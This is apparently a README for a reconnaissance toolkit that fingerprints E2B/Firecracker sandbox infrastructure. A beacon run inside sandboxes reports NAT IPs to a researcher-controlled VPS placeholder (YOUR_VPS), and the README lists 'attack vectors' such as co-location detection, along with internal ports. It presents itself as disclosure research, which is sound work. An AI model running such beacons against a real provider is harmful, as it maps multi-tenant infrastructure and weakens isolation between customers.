# E2B Sandbox Infrastructure Fingerprinting

**Passive reconnaissance toolkit for E2B/Firecracker infrastructure via NAT enumeration**

## Components

1. **http_echo_server.py** - VPS echo server (port 8080)
2. **https_echo_server.py** - HTTPS variant with TLS fingerprinting (port 8443)
3. **fingerprint_beacon.py** - E2B sandbox beacon script

## Quick Start

**VPS Deploy:**
```bash
scp http_echo_server.py root@YOUR_VPS:~/
ssh root@YOUR_VPS 'python3 ~/http_echo_server.py'
```

**E2B Beacon:**
```python
exec(open('fingerprint_beacon.py').read())
```

**Multi-Run Analysis:**
```python
import requests
results = []
for i in range(10):
    r = requests.get('http://YOUR_VPS:8080/test')
    results.append(r.json()['client']['ip'])
print(f"Unique NATs: {len(set(results))}")
print(f"Co-location: {[ip for ip in set(results) if results.count(ip) > 1]}")
```

## Attack Vectors

- **Host Co-location Detection** - Same NAT IP = same Firecracker host
- **Infrastructure Mapping** - Enumerate AWS regions via NAT IPs
- **Port Pattern Analysis** - NAT implementation fingerprinting
- **TLS Stack Identification** - OS/library version via ciphers

## Security Implications

⚠️ **For E2B:**
- Infrastructure topology leak
- Cross-sandbox correlation possible
- Timing side-channel prerequisites

✅ **For Disclosure:**
- Advanced reconnaissance capability
- Multi-tenant isolation concerns
- Actionable hardening recommendations

## Architecture

E2B uses Firecracker MicroVM with:
- envd Go agent (PID ~347, gRPC :49983)
- FastAPI control :49999
- Jupyter kernels :8888
- NAT gateway for egress

## Responsible Use

For security research and coordinated disclosure only.

**Research by [@pv-udpv](https://github.com/pv-udpv) - Feb 2026**
